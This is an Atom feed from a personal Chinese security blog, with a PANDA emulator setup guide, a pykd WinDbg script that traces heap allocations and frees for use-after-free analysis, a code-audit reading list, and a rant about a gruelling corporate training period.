<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>o0xmuhe&#39;s blog</title>
  <subtitle>一个有情怀的二进制狗</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://o0xmuhe.me/"/>
  <updated>2018-11-08T04:33:19.015Z</updated>
  <id>http://o0xmuhe.me/</id>
  
  <author>
    <name>muhe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello PANDA</title>
    <link href="http://o0xmuhe.me/2018/11/08/Hello-PANDA/"/>
    <id>http://o0xmuhe.me/2018/11/08/Hello-PANDA/</id>
    <published>2018-11-08T04:15:43.000Z</published>
    <updated>2018-11-08T04:33:19.015Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0-Environment"><a href="#0-Environment" class="headerlink" title="0. Environment"></a>0. Environment</h4><p>Ubuntu16.04 x64</p>
<a id="more"></a>
<h4 id="1-Install-Panda"><a href="#1-Install-Panda" class="headerlink" title="1. Install Panda"></a>1. Install Panda</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/moyix/panda.git</span><br><span class="line"><span class="built_in">cd</span> panda</span><br><span class="line">./panda_install.bash</span><br></pre></td></tr></table></figure>
<h4 id="2-Working-Folder-and-HDD"><a href="#2-Working-Folder-and-HDD" class="headerlink" title="2. Working Folder and HDD"></a>2. Working Folder and HDD</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir my_first_panda</span><br><span class="line">$ <span class="built_in">cd</span> my_first_panda</span><br><span class="line">$ ../qemu/qemu-img create <span class="_">-f</span> qcow2 test.img 32G</span><br></pre></td></tr></table></figure>
<h4 id="3-Boot-VM"><a href="#3-Boot-VM" class="headerlink" title="3. Boot VM"></a>3. Boot VM</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024</span><br></pre></td></tr></table></figure>
<p>you will get:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  my_first_panda git:(master) ✗ ../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024</span><br><span class="line"></span><br><span class="line">(process:21836): GLib-WARNING **: /build/glib2.0-7ZsPUq/glib2.0-2.48.2/./glib/gmem.c:483: custom memory allocation vtable not supported</span><br><span class="line">QEMU 1.0,1 monitor - <span class="built_in">type</span> <span class="string">'help'</span> <span class="keyword">for</span> more information</span><br><span class="line">(qemu) change ide1-cd0 win_server_2008_r2.iso </span><br><span class="line">(qemu)</span><br></pre></td></tr></table></figure>
<p>mount your iso file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(qemu) change ide1-cd0 win_server_2008_r2.iso </span><br><span class="line">(qemu)</span><br></pre></td></tr></table></figure>
<h4 id="4-Install-OS"><a href="#4-Install-OS" class="headerlink" title="4. Install OS"></a>4. Install OS</h4><p>Connect your vm with a VNC client, press <code>ctrl + opt + del</code>(on macOS) / <code>ctrl + alt + del</code>(on Windows) to reboot your vm,then you are able to install the OS.</p>
<h4 id="5-Record-Replay-with-PANDA"><a href="#5-Record-Replay-with-PANDA" class="headerlink" title="5. Record/Replay with PANDA"></a>5. Record/Replay with PANDA</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qemu) begin_record <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>….</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qemu) end_record</span><br></pre></td></tr></table></figure>
<p>now you can replay (with replay movie plugin)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../qemu/x86_64-softmmu/qemu-system-x86_64 -replay <span class="built_in">test</span> -panda replaymovie -m 2048</span><br></pre></td></tr></table></figure>
<p>other plugins? Taint?cov?  :)</p>
<h4 id="6-Reference"><a href="#6-Reference" class="headerlink" title="6. Reference"></a>6. Reference</h4><p><a href="https://gist.github.com/bridgeythegeek/d7a6c449287c6e32187be2639a7920bf" target="_blank" rel="noopener">My first panda</a></p>
<p><a href="https://github.com/panda-re/panda/blob/master/panda/plugins/callstack_instr/USAGE.md" target="_blank" rel="noopener">Panda Usage</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0-Environment&quot;&gt;&lt;a href=&quot;#0-Environment&quot; class=&quot;headerlink&quot; title=&quot;0. Environment&quot;&gt;&lt;/a&gt;0. Environment&lt;/h4&gt;&lt;p&gt;Ubuntu16.04 x64&lt;/p&gt;
    
    </summary>
    
    
      <category term="PANDA" scheme="http://o0xmuhe.me/tags/PANDA/"/>
    
      <category term="RE" scheme="http://o0xmuhe.me/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>UAF analysis : using pykd</title>
    <link href="http://o0xmuhe.me/2018/11/07/UAF-analysis-using-pykd/"/>
    <id>http://o0xmuhe.me/2018/11/07/UAF-analysis-using-pykd/</id>
    <published>2018-11-07T09:52:40.000Z</published>
    <updated>2018-11-07T10:05:16.607Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 : 简介"></a>0x01 : 简介</h4><p>分析一些情况比较复杂的UAF漏洞时，比如很多次分配、使用内存，费力寻找被UAF的对象的释放点，是比较麻烦的(对于我这种菜逼来说)，这时候可以使用pykd来辅助这个工作，能使得漏洞分析工作变得更轻松。 </p>
<a id="more"></a>
<h4 id="0x02-脚本模版"><a href="#0x02-脚本模版" class="headerlink" title="0x02 : 脚本模版"></a>0x02 : 脚本模版</h4><p>这个脚本的<a href="https://labs.mwrinfosecurity.com/blog/heap-tracing-with-windbg-and-python/" target="_blank" rel="noopener">原始版本</a>在使用的时候有点问题，我本地测试的时候回调函数有点问题，不能正常使用。</p>
<p>后来咨询了无言学长之后，学长帮忙做了修改:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pykd</span><br><span class="line"></span><br><span class="line">return_reg = <span class="string">"rax"</span></span><br><span class="line">stack_pointer = <span class="string">"rsp"</span></span><br><span class="line">arch_bits = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(localAddr)</span>:</span></span><br><span class="line">    res = pykd.dbgCommand(<span class="string">"x "</span> + localAddr)</span><br><span class="line">    result_count = res.count(<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> result_count == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> localAddr + <span class="string">" not found."</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> result_count &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] Warning, more than one result for"</span>, localAddr</span><br><span class="line">    <span class="keyword">return</span> res.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlAllocateHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags,</span></span><br><span class="line"><span class="comment"># IN ULONG                Size );</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_allocate_heap</span><span class="params">(pykd.eventHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        addr = get_address(<span class="string">"ntdll!RtlAllocateHeap"</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(int(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.out = <span class="string">"RtlAllocateHeap("</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0xC</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rcx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rdx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r8"</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="keyword">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">"uf ntdll!RtlAllocateHeap"</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(int(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlFreeHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags OPTIONAL,</span></span><br><span class="line"><span class="comment"># IN PVOID                MemoryPointer );</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_free_heap</span><span class="params">(pykd.eventHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        addr = get_address(<span class="string">"ntdll!RtlFreeHeap"</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(int(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.out = <span class="string">"RtlFreeHeap("</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">0xC</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rcx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rdx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r8"</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="keyword">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">"uf ntdll!RtlFreeHeap"</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(int(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># returns a BOOLEAN which is a byte under the hood</span></span><br><span class="line">        ret_val = hex(pykd.reg(<span class="string">"al"</span>))</span><br><span class="line">        pykd.dprintln(self.out + ret_val + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlReAllocateHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags,</span></span><br><span class="line"><span class="comment"># IN PVOID                MemoryPointer,</span></span><br><span class="line"><span class="comment"># IN ULONG                Size );</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_realloc_heap</span><span class="params">(pykd.eventHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        addr = get_address(<span class="string">"ntdll!RtlReAllocateHeap"</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(int(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.out = <span class="string">"RtlReAllocateHeap("</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">0xC</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x10</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rcx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rdx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r8"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r9"</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="keyword">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">"uf ntdll!RtlReAllocateHeap"</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(int(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pykd.reg(<span class="string">"rax"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    arch_bits = <span class="number">32</span></span><br><span class="line">    return_reg = <span class="string">"eax"</span></span><br><span class="line">    stack_pointer = <span class="string">"esp"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#addr = get_address("ntdll!RtlReAllocateHeap")</span></span><br><span class="line"><span class="comment">#print addr</span></span><br><span class="line"></span><br><span class="line">pykd.removeAllBp()</span><br><span class="line">bp_a1 = handle_allocate_heap()</span><br><span class="line">bp_a2 = handle_free_heap()</span><br><span class="line">bp_a3 = handle_realloc_heap()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'bps=%x'</span> %pykd.getNumberBreakpoints()</span><br></pre></td></tr></table></figure>
<p>我基于这些模版，写了自己做漏洞分析的时候使用的脚本。 思路也比较简单，就是找到目标对象的分配、释放点，下断点，自动记录分配/释放的内存地址、大小，然后做一个输出供自己分析用。</p>
<p>效果当然是很舒服啦  :)</p>
<h4 id="0x03-使用效果"><a href="#0x03-使用效果" class="headerlink" title="0x03 : 使用效果"></a>0x03 : 使用效果</h4><p>目标是大型软件时，windbg会有点卡，等一下就好了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; .load pykd</span><br><span class="line">&gt; !py -g path/to/script.py</span><br><span class="line">&gt; g</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x276fbff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26af2ff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x27657ff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1cff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1aff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257aaff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257bcff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x2694aff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x255cfff0</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x255cfff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x2694aff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x257bcff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x257aaff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x26f1aff0L) = 0x1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 : 简介&quot;&gt;&lt;/a&gt;0x01 : 简介&lt;/h4&gt;&lt;p&gt;分析一些情况比较复杂的UAF漏洞时，比如很多次分配、使用内存，费力寻找被UAF的对象的释放点，是比较麻烦的(对于我这种菜逼来说)，这时候可以使用pykd来辅助这个工作，能使得漏洞分析工作变得更轻松。 &lt;/p&gt;
    
    </summary>
    
    
      <category term="vuln analysis" scheme="http://o0xmuhe.me/tags/vuln-analysis/"/>
    
      <category term="uaf" scheme="http://o0xmuhe.me/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>代码审计培养计划</title>
    <link href="http://o0xmuhe.me/2018/10/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%B9%E5%85%BB%E8%AE%A1%E5%88%92/"/>
    <id>http://o0xmuhe.me/2018/10/05/代码审计培养计划/</id>
    <published>2018-10-05T12:53:52.000Z</published>
    <updated>2018-10-22T08:15:14.316Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-为什么要搞这个"><a href="#0x00-为什么要搞这个" class="headerlink" title="0x00 : 为什么要搞这个"></a>0x00 : 为什么要搞这个</h4><p>因为我菜啊，而且我想学代码审计啊。</p>
<a id="more"></a>
<h4 id="0x01-第一步"><a href="#0x01-第一步" class="headerlink" title="0x01 : 第一步"></a>0x01 : 第一步</h4><p>先找点代码来读一读，学习一下，培养下代码阅读能力啥的。</p>
<h5 id="脚本引擎"><a href="#脚本引擎" class="headerlink" title="脚本引擎"></a>脚本引擎</h5><ul>
<li>tiny js </li>
</ul>
<p>just a demo0 </p>
<p><a href="https://github.com/gfwilliams/tiny-js.git" target="_blank" rel="noopener">https://github.com/gfwilliams/tiny-js.git</a></p>
<ul>
<li>jerryscript </li>
</ul>
<p>ECMS 5.1 </p>
<p><a href="https://github.com/jerryscript-project/jerryscript.git" target="_blank" rel="noopener">https://github.com/jerryscript-project/jerryscript.git</a></p>
<ul>
<li>Espruino (MPL v2.0) </li>
</ul>
<p>给嵌入式设备用的，很小 </p>
<ul>
<li>MuJS (Affero GPL) </li>
</ul>
<p>很小 demo类型 </p>
<ul>
<li>quad-wheel (MIT License) </li>
</ul>
<ul>
<li>v7 (GPL v2.0) </li>
</ul>
<p>准备先看tiny js，从最小的开始，后面看一个稍微大一点的 2 或者3 这样的。 </p>
<h5 id="文件格式类"><a href="#文件格式类" class="headerlink" title="文件格式类"></a>文件格式类</h5><p>一些小型的格式解析库、软件 </p>
<ul>
<li>Xml : tinyXML / rapidxml </li>
</ul>
<ul>
<li>PDF : mupdf / pdfium </li>
</ul>
<h4 id="0x02-已读"><a href="#0x02-已读" class="headerlink" title="0x02 : 已读"></a>0x02 : 已读</h4><ul>
<li>tiny-js</li>
</ul>
<p>就是个demo js engine，支持的东西也很基本，就是解析到token序列，然后 case TOKEN，然后走不同的执行流，执行js code。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-为什么要搞这个&quot;&gt;&lt;a href=&quot;#0x00-为什么要搞这个&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 为什么要搞这个&quot;&gt;&lt;/a&gt;0x00 : 为什么要搞这个&lt;/h4&gt;&lt;p&gt;因为我菜啊，而且我想学代码审计啊。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>飞扬历险记</title>
    <link href="http://o0xmuhe.me/2018/08/13/%E9%A3%9E%E6%89%AC%E5%8E%86%E9%99%A9%E8%AE%B0/"/>
    <id>http://o0xmuhe.me/2018/08/13/飞扬历险记/</id>
    <published>2018-08-13T08:58:43.000Z</published>
    <updated>2018-08-26T08:05:19.708Z</updated>
    
    <content type="html"><![CDATA[<p>本故事纯属虚构，如有雷同，那就雷同吧。</p>
<a id="more"></a>
<ol>
<li><p>飞之前，工作地十分开心，能感受到自己每天在进步，反正就是工作的很开心。</p>
</li>
<li><p>自从八月六号之后，一切都变了，我开始变得负能量爆棚，骂街的频率也陡然升高。</p>
</li>
<li><p>每天9点多到，晚上不知道几点才能走，最早的一次十一点四十，最晚的一次凌晨两点多。布置那么多东西，像幼儿园小朋友一样的活动，真的是没啥意义。</p>
</li>
<li><p>半个月的时间，耽误了很多工作，再次回到工作中，有些不适应吧，花了点时间去同步、适应，太蠢了这个东西。</p>
</li>
<li><p>让我情绪比较爆发的还是后几天中，一个妹子的事，过敏+上呼吸道感染，请假居然不允许，还强行让人家去脱口秀讲话，之后还说不合格，后天再来。真的是牛逼到不行。 你们是真的都不会生病，铁人，很厉害，希望你们生病的时候也能坚持坚持再坚持。</p>
</li>
<li><p>后面还发生了用手掂起人家电脑屏幕，摔的那种方式合上并收走的事，作为一个IT🐶，这个真的不能忍，问候一下他全家。</p>
</li>
<li><p>挺搞笑的一件事，实习生刚来就半个月这么陪着一起熬，最后一天结束的时候，领导说几句“感人”的话…兄弟，现实点，加班费。</p>
</li>
</ol>
<p>最后，真的很无聊，<strong>自助难吃的一批</strong>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本故事纯属虚构，如有雷同，那就雷同吧。&lt;/p&gt;
    
    </summary>
